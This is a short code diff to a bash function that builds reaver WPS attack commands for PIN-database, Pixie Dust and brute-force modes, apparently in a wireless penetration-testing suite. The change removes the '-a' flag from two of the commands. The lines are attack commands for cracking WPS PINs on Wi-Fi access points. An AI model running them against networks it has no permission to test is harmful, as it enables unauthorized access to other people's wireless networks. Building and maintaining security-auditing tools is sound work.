@@ -4915,13 +4915,13 @@ function set_wps_attack_script() {
 		unbuffer=""
 		case ${wps_attack_mode} in
 			"pindb"|"custompin")
-				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -a -g 1 -d 2 -vvv -p "
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -g 1 -d 2 -vvv -p "
 			;;
 			"pixiedust")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -K 1 -N -vvv"
 			;;
 			"bruteforce")
-				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -a -d 2 -vvv"
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -d 2 -vvv"
 			;;
 		esac
 	else
